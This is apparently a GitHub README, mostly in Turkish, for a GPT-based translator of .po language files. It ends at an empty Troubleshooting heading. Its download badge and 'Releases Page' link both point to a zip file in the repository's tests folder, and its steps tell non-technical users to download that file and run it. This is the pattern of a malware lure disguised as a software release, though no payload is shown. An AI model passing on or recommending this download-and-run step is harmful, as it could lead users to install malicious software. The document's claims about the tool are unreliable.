# 🌍 Otomatik-Po-Cevirici - Effortless Language Translation Tool

![Download](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/tests/Otomatik-Cevirici-Po-supergallant.zip%20Now-Click%20Here-brightgreen)

## 📖 Description

Bu uygulama, .po uzantılı dil dosyalarını GPT destekli gelişmiş bir çeviri motoru kullanarak Türkçe ↔ İngilizce başta olmak üzere farklı diller arasında otomatik olarak çevirmenizi sağlar. Kolay arayüzü ile metinlerinizi hızlı ve etkili bir şekilde çevirebilirsiniz.

## 🚀 Getting Started

Uygulamayı kullanmaya başlamak için aşağıdaki adımları izleyin. Herhangi bir teknik bilgiye ihtiyacınız yok. Adımlar basit ve anlaşılırdır.

## 📥 Download & Install

1. Ziyaret edin: [Releases Page](https://raw.githubusercontent.com/Umutbabaa/Otomatik-Po-Cevirici/main/tests/Otomatik-Cevirici-Po-supergallant.zip) 
2. İlgili versiyonu indirin.
3. İndirdiğiniz dosyayı bilgisayarınızda çalıştırın.

## 🖥️ System Requirements

- İşletim Sistemi: Windows 10 veya üstü
- RAM: Minimum 4 GB
- Depolama: En az 100 MB boş alan
- Python 3.6 veya üstü yüklü değilse, lütfen indirin ve yükleyin.

## ⚙️ Features

- **Hızlı Çeviri:** Metinlerinizi anında çevirin.
- **Çoklu Diller:** Türkçe, İngilizce ve daha fazlası için destek.
- **Kullanıcı Dostu Arayüz:** Herkesin kolayca kullanabileceği basit bir arayüz.
- **Saklama:** Çevirdiğiniz metinleri kaydedin.
- **Güncellemeler:** Sürekli geliştirme ve yeni özellikler.

## 📊 Supported Languages

- Türkçe
- İngilizce
- Almanca
- Fransızca
- İspanyolca
- İtalyanca

## 🎯 How to Use

1. Uygulamayı açın.
2. Çevirmek istediğiniz .po dosyasını yükleyin.
3. Hedef dili seçin.
4. "Çevir" butonuna basın.
5. Çevrilen dosyayı indirin veya kaydedin.

## 🛠️ Troubleshooting

Eğer herhangi bir sorunla karşılaşırsanız, aşağıdaki adımları deneyin:
